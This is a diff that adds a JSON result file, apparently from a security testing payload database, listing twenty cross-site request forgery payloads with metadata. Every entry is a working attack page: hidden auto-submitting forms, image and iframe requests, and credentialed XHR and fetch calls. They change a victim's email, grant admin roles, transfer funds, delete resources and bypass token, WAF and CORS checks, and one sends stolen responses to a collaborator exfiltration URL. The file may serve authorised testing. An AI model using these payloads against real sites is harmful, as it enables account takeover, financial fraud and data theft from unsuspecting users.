@@ -1,0 +1,430 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "csrf"
+  },
+  "count": 20,
+  "results": [
+    {
+      "id": "01386059c6a028fc",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cimg src=\"TARGET_URL?action=delete\u0026id=RESOURCE_ID\" style=\"display:none\" onerror=\"this.src='TARGET_URL?action=delete\u0026id=RESOURCE_ID\u0026retry=1'\"/\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "image_tag",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "RESOURCE_ID"
+      ],
+      "notes": "Image tag CSRF with retry on error. Uses onerror handler to retry the request with a modified parameter if the first attempt fails. Targets GET-based destructive actions.",
+      "source": "ensphere",
+      "tags": [
+        "destructive",
+        "get_method",
+        "img",
+        "retry"
+      ]
+    },
+    {
+      "id": "1b24d461d69050be",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003efor(var i=1;i\u003c=5;i++){var img=new Image();img.src='TARGET_URL?action=delete\u0026id='+i;}\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "image_tag",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL"
+      ],
+      "notes": "Multi-target image CSRF. Creates multiple image objects in a loop, each firing a separate GET request. Deletes or modifies multiple resources in a single page load.",
+      "source": "ensphere",
+      "tags": [
+        "bulk",
+        "get_method",
+        "img",
+        "multi_target"
+      ]
+    },
+    {
+      "id": "29618bbf0be879a2",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"multipart/form-data\"\u003e\u003cinput type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Multipart form-data CSRF. Uses multipart encoding which some CSRF protections fail to validate because they only inspect application/x-www-form-urlencoded requests.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "encoding_bypass",
+        "multipart"
+      ]
+    },
+    {
+      "id": "35faf066ee42ed06",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003efetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'PARAM=VALUE'});\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "fetch_cross_origin",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Fetch API POST with credentials:include. Modern alternative to XHR. Sends cookies cross-origin. Simple content type avoids preflight.",
+      "source": "ensphere",
+      "tags": [
+        "credentials_include",
+        "cross_origin",
+        "fetch"
+      ]
+    },
+    {
+      "id": "459f2154469f35ef",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"\u003e\u003cinput type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Basic auto-submitting form. On page load the form fires a POST to the target with attacker-chosen parameters. Victim's browser attaches session cookies automatically.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "basic",
+        "confirmation"
+      ]
+    },
+    {
+      "id": "54f717e758528a01",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"multipart/form-data\"\u003e\u003cinput type=\"hidden\" name=\"action\" value=\"update_profile\"/\u003e\u003cinput type=\"hidden\" name=\"admin\" value=\"true\"/\u003e\u003cinput type=\"file\" name=\"avatar\" style=\"display:none\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL"
+      ],
+      "notes": "Multipart form with file field. The presence of a file input forces multipart encoding. Some server-side frameworks route multipart requests through different parsing logic that skips CSRF validation.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "file_upload",
+        "multipart",
+        "protection_bypass"
+      ]
+    },
+    {
+      "id": "5b6f2188e4a20ccd",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" target=\"hidden_iframe\"\u003e\u003cinput type=\"hidden\" name=\"PARAM\" value=\"VALUE\"/\u003e\u003c/form\u003e\u003ciframe name=\"hidden_iframe\" style=\"display:none\"\u003e\u003c/iframe\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "redirect",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Hidden iframe form submission. Posts to a hidden iframe so the victim stays on the attacker page and does not notice the navigation. Stealthier than direct form submit.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "iframe",
+        "stealth"
+      ]
+    },
+    {
+      "id": "5b8c863abc36c341",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cimg src=\"TARGET_URL?PARAM=VALUE\" style=\"display:none\"/\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "image_tag",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Image tag GET CSRF. The browser sends a GET request with cookies to load the image. Exploits state-changing GET endpoints (logout, delete, toggle). No JavaScript required.",
+      "source": "ensphere",
+      "tags": [
+        "get_method",
+        "img",
+        "no_js",
+        "simple"
+      ]
+    },
+    {
+      "id": "8bcff340f07008dc",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003ciframe src=\"TARGET_URL?PARAM=VALUE\" style=\"display:none\"\u003e\u003c/iframe\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "image_tag",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Hidden iframe GET CSRF. Loads the target URL in an invisible iframe, triggering the GET request with the victim's cookies. Works for endpoints that return non-image content types.",
+      "source": "ensphere",
+      "tags": [
+        "get_method",
+        "iframe",
+        "stealth"
+      ]
+    },
+    {
+      "id": "8c2963af443f13e1",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003evar xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('PARAM=VALUE');\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "xhr_cross_origin",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "XHR POST with withCredentials. Sends a cross-origin POST carrying session cookies. Works if the target has a permissive CORS policy or does not require a preflight for this content type.",
+      "source": "ensphere",
+      "tags": [
+        "cross_origin",
+        "withCredentials",
+        "xhr"
+      ]
+    },
+    {
+      "id": "9899cf431763e194",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003evar xhr=new XMLHttpRequest();xhr.open('DELETE','TARGET_URL/RESOURCE_ID',true);xhr.withCredentials=true;xhr.send();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "xhr_cross_origin",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "RESOURCE_ID"
+      ],
+      "notes": "XHR DELETE CSRF. Sends a cross-origin DELETE request. If the server has Access-Control-Allow-Credentials: true with a permissive origin, the resource is deleted under the victim's session.",
+      "source": "ensphere",
+      "tags": [
+        "cross_origin",
+        "delete_method",
+        "destructive",
+        "xhr"
+      ]
+    },
+    {
+      "id": "a547eec3db9f9b98",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"\u003e\u003cinput type=\"hidden\" name=\"role\" value=\"admin\"/\u003e\u003cinput type=\"hidden\" name=\"user_id\" value=\"VICTIM_ID\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL",
+        "VICTIM_ID"
+      ],
+      "notes": "Privilege escalation CSRF. Changes the victim's role to admin or grants elevated permissions. Targets user management or role-assignment endpoints.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "privilege_escalation",
+        "role_change"
+      ]
+    },
+    {
+      "id": "fa72eb8d877b46c6",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"\u003e\u003cinput type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"/\u003e\u003cinput type=\"hidden\" name=\"confirm\" value=\"1\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 2,
+      "placeholders": [
+        "TARGET_URL"
+      ],
+      "notes": "Email change CSRF. Overwrites the victim's email address with an attacker-controlled one, enabling account takeover via password reset.",
+      "source": "ensphere",
+      "tags": [
+        "account_takeover",
+        "auto_submit",
+        "email_change"
+      ]
+    },
+    {
+      "id": "06c620581ae58340",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\"\u003e\u003cinput type=\"hidden\" name=\"to_account\" value=\"ATTACKER_ACCT\"/\u003e\u003cinput type=\"hidden\" name=\"amount\" value=\"10000\"/\u003e\u003cinput type=\"hidden\" name=\"currency\" value=\"USD\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "ATTACKER_ACCT"
+      ],
+      "notes": "Fund transfer CSRF. Initiates a money transfer from the victim's account to an attacker-controlled account. High-impact financial action.",
+      "source": "ensphere",
+      "tags": [
+        "auto_submit",
+        "financial",
+        "fund_transfer"
+      ]
+    },
+    {
+      "id": "07be13846b826db7",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003evar xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','multipart/form-data; boundary=----WebKitFormBoundary');var body='------WebKitFormBoundary\\r\\nContent-Disposition: form-data; name=\"PARAM\"\\r\\n\\r\\nVALUE\\r\\n------WebKitFormBoundary--';xhr.send(body);\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "xhr_cross_origin",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "XHR with manually crafted multipart boundary. Some CSRF protections only validate tokens in urlencoded bodies but not in multipart. The custom boundary trick can also bypass WAFs that do not parse multipart.",
+      "source": "ensphere",
+      "tags": [
+        "boundary_trick",
+        "multipart",
+        "protection_bypass",
+        "xhr"
+      ]
+    },
+    {
+      "id": "094d5a75d4960d9a",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003efetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'PARAM=VALUE'}).then(r=\u003er.text()).then(t=\u003e{fetch('https://COLLAB_DOMAIN/exfil?data='+btoa(t))});\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "fetch_cross_origin",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "callback_hit",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE",
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "Fetch CSRF with response exfiltration. After forging the request, reads the response and sends it to a collaborator server. Only works if CORS allows reading the response (Access-Control-Allow-Origin with credentials).",
+      "source": "ensphere",
+      "tags": [
+        "callback",
+        "cross_origin",
+        "exfiltration",
+        "fetch"
+      ]
+    },
+    {
+      "id": "0f73ef9724ed131e",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003evar xhr=new XMLHttpRequest();xhr.open('POST','TARGET_URL',true);xhr.withCredentials=true;xhr.setRequestHeader('Content-Type','text/plain');xhr.send('{\"PARAM\":\"VALUE\"}');\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "xhr_cross_origin",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "XHR JSON body with text/plain content type. Bypasses CORS preflight because text/plain is a simple content type. If the server parses the body as JSON regardless of Content-Type, the attack succeeds.",
+      "source": "ensphere",
+      "tags": [
+        "content_type_bypass",
+        "json",
+        "text_plain",
+        "xhr"
+      ]
+    },
+    {
+      "id": "1d2de85e71c46841",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003efetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'{\"PARAM\":\"VALUE\"}'});\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "fetch_cross_origin",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "Fetch API JSON CSRF with text/plain bypass. Uses text/plain to skip CORS preflight while sending a JSON body. Exploits servers that parse body content irrespective of Content-Type header.",
+      "source": "ensphere",
+      "tags": [
+        "content_type_bypass",
+        "fetch",
+        "json",
+        "text_plain"
+      ]
+    },
+    {
+      "id": "2223d5e63e0534f1",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cform id=\"csrf\" method=\"POST\" action=\"TARGET_URL\" enctype=\"text/plain\"\u003e\u003cinput name='{\"PARAM\":\"VALUE\",\"ignore_me\":\"' value='\"}' type=\"hidden\"/\u003e\u003c/form\u003e\u003cscript\u003edocument.getElementById('csrf').submit();\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "form_auto_submit",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL",
+        "PARAM",
+        "VALUE"
+      ],
+      "notes": "JSON CSRF via form with text/plain enctype. The form constructs a body like {\"PARAM\":\"VALUE\",\"ignore_me\":\"=}. If the server parses this as JSON (lenient parser), the PARAM key is set. Classic content-type bypass.",
+      "source": "ensphere",
+      "tags": [
+        "content_type_bypass",
+        "form_trick",
+        "json",
+        "text_plain"
+      ]
+    },
+    {
+      "id": "2a813e9f0ea62606",
+      "payload": "\u003chtml\u003e\u003cbody\u003e\u003cscript\u003efetch('TARGET_URL',{method:'POST',credentials:'include',headers:{'Content-Type':'text/plain'},body:'eyJhY3Rpb24iOiJkZWxldGUiLCJ1c2VyIjoiYWRtaW4ifQ=='});\u003c/script\u003e\u003c/body\u003e\u003c/html\u003e",
+      "technique": "fetch_cross_origin",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [
+        "TARGET_URL"
+      ],
+      "notes": "Fetch with base64-encoded JSON payload via text/plain. Targets endpoints that base64-decode the request body before parsing JSON. Dodges WAF inspection of plaintext JSON.",
+      "source": "ensphere",
+      "tags": [
+        "base64",
+        "content_type_bypass",
+        "fetch",
+        "obfuscation"
+      ]
+    }
+  ]
+}
